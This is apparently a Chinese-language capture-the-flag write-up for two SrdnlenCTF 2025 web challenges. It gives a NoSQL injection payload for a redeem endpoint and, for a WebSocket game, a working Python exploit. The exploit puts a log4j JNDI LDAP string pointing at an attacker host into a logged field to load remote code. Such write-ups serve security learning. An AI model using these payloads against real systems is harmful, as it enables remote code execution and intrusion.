# 2025-SrdnlenCTF

  
  
&lt;!--more--&gt;  
## SPEED  
在`/redeem`存在`nosql`注入，  
`payload: ?discountCode[$ne]=null`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202156035.png)
并且存在并发，利用领取到金币，即可购买`flag`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202158036.png)
购买`flag`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202159695.png)
## sparklingsky  
利用`websocket`实现了一个小游戏  
```java  
from flask_socketio import emit  
from flask_login import current_user, login_required  
from threading import Lock  
from .models import *  
from anticheat import log_action, analyze_movement  
lock = Lock()  
  
def init_socket_events(socketio, players):  
    @socketio.on(&#39;connect&#39;)  
    @login_required  
    def handle_connect():  
        user_id = int(current_user.get_id())  
        log_action(user_id, &#34;is connecting&#34;)  
          
        if user_id in players.keys():  
            # Player already exists, send their current position  
            emit(&#39;connected&#39;, {&#39;user_id&#39;: user_id, &#39;x&#39;: players[user_id][&#39;x&#39;], &#39;y&#39;: players[user_id][&#39;y&#39;], &#39;angle&#39;: players[user_id][&#39;angle&#39;]})  
        else:  
            # TODO: Check if the lobby is full and add the player to the queue  
            log_action(user_id, f&#34;is spectating&#34;)  
        emit(&#39;update_bird_positions&#39;, players, broadcast=True)  
  
    @socketio.on(&#39;move_bird&#39;)  
    @login_required  
    def handle_bird_movement(data):  
        user_id = data.get(&#39;user_id&#39;)  
        log_action(user_id, &#34;is active&#34;)          
        if user_id in players:  
            del data[&#39;user_id&#39;]  
            if players[user_id] != data:  
                with lock:  
                    players[user_id] = {  
                        &#39;x&#39;: data[&#39;x&#39;],  
                        &#39;y&#39;: data[&#39;y&#39;],  
                        &#39;color&#39;: &#39;black&#39;,  
                        &#39;angle&#39;: data.get(&#39;angle&#39;, 0)  
                    }  
                    log_action(user_id, &#34;is success&#34;)  
                    if analyze_movement(user_id, data[&#39;x&#39;], data[&#39;y&#39;], data.get(&#39;angle&#39;, 0)):  
                        log_action(user_id, f&#34;was cheating with final position ({data[&#39;x&#39;]}, {data[&#39;y&#39;]}) and final angle: {data[&#39;angle&#39;]}&#34;)  
                        # del players[user_id] # Remove the player from the game - we are in beta so idc  
                    emit(&#39;update_bird_positions&#39;, players, broadcast=True)  
  
    @socketio.on(&#39;disconnect&#39;)  
    @login_required  
    def handle_disconnect(data):  
        user_id = current_user.get_id()  
        if user_id in players:  
            del players[user_id]  
        emit(&#39;update_bird_positions&#39;, players, broadcast=True)  
```  
在**超速**的情况下，会被日志记录  
`log_action(user_id, f&#34;was cheating with final position ({data[&#39;x&#39;]}, {data[&#39;y&#39;]}) and final angle: {data[&#39;angle&#39;]}&#34;)`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202231582.png)
日志记录利用了存在漏洞的`log4j`，并且启动时还设置了`trustURLCodebase=true`  
直接打 JNDI 即可，  
**超速**要求  
```java  
user_states = {}  
  
# Anti-cheat thresholds  
MAX_SPEED = 1000  # Max units per second  
  
def analyze_movement(user_id, new_x, new_y, new_angle):  
  
    global user_states  
  
    # Initialize user state if not present  
    if user_id not in user_states:  
        user_states[user_id] = {  
            &#39;last_x&#39;: new_x,  
            &#39;last_y&#39;: new_y,  
            &#39;last_time&#39;: time.time(),  
            &#39;violations&#39;: 0,  
        }  
  
    user_state = user_states[user_id]  
    last_x = user_state[&#39;last_x&#39;]  
    last_y = user_state[&#39;last_y&#39;]  
    last_time = user_state[&#39;last_time&#39;]  
  
    # Calculate distance and time elapsed  
    distance = math.sqrt((new_x - last_x)**2 &#43; (new_y - last_y)**2)  
    time_elapsed = time.time() - last_time  
    speed = distance / time_elapsed if time_elapsed &gt; 0 else 0  
  
    # Check for speed violations  
    if speed &gt; MAX_SPEED:  
        return True  
  
    # Update the user state  
    user_states[user_id].update({  
        &#39;last_x&#39;: new_x,  
        &#39;last_y&#39;: new_y,  
        &#39;last_time&#39;: time.time(),  
    })  
  
    return False  
```  
利用此项目  
https://github.com/X1r0z/JNDIMap  
构造`exp`  
```java  
import socketio  
sio = socketio.Client()  
@sio.event  
def connect():  
    print(&#39;Connected to the server&#39;)  
  
@sio.event  
def connected(data):  
    print(&#39;Server says:&#39;, data)  
  
@sio.event  
def update_bird_positions(players):  
    print(&#39;Updated bird positions:&#39;, players)  
  
@sio.event  
def disconnect():  
    print(&#39;Disconnected from the server&#39;)  
  
# 发送消息到服务器  
def send_move_bird(user_id, x, y, angle):  
    sio.emit(&#39;move_bird&#39;, {&#39;user_id&#39;: user_id, &#39;x&#39;: x, &#39;y&#39;: y, &#39;angle&#39;: angle})  
1  
# 连接到服务器  
def main():  
    headers={  
        &#34;Cookie&#34;:&#34;session=.eJwlzjEOwzAIAMC_MHcAu4DJZyJsQO2aNFPVv7dS51vuDXsdeT5gex1X3mB_BmzgU31QDEnuhMZTiHWwpLHEmuxuPTTUWzjr7GKqrRFOk1LXVRkWrZeqFzahKYMckc1_xEiZLLxyWCtRJHbtVkiyEF1W3OEXuc48_hsi-HwB1JYvGQ.Z40fRA.RAjyNPzzmC-a4dPG6ww7MztPteU&#34;  
    }  
    sio.connect(&#39;http://sparklingsky.challs.srdnlen.it:8081/&#39;,headers=headers)    
    while True:  
        send_move_bird(user_id=1, x=0, y=0, angle=90)  
        send_move_bird(user_id=1, x=10000, y=100000000, angle=&#34;${jndi:ldap://ip:port/Basic/FromFile/Evil.class}&#34;)  
    sio.wait()  
if __name__ == &#34;__main__&#34;:  
    main()  
```  
  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/2025-srdnlenctf/  

